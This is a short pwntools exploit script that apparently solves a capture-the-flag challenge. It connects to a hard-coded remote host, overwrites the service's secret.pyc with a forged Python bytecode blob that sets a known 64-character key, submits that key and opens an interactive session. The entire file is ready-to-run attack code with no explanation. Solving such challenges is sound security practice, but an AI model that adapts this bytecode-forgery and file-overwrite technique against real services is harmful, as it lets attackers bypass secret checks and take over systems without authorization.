from pwn import *
context.arch = "amd64"

host = '35.201.132.60'
port = 12000
#host = 'localhost'
#port = 6666
r = remote(host, port)
#r = process('./xxx')

pyc = "000000000000000100000040000000730a0000006400005a00006401005328020000007440000000363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636364e280100000074030000006b657928000000002800000000280000000073350000002f686f6d652f6362642f4465736b746f702f4e54552f4354462f66696e616c2f507974686f6e32456173792f7365637265742e707974080000003c6d6f64756c653e0d0000007300000000"

r.recvuntil(':')
r.sendline('cbd')
r.recvuntil(':')
r.sendline('0')
r.recvuntil(':')
r.sendline('secret.pyc')
res = r.recvuntil(':').split('\n')[0].strip()
payload = res + pyc
r.sendline('1')
r.recvuntil(':')
r.sendline('secret.pyc')
r.recvuntil(':')
r.sendline(payload)
r.recvuntil(':')
r.sendline('2')
r.recvuntil(':')
r.sendline('6'*64)

r.interactive()
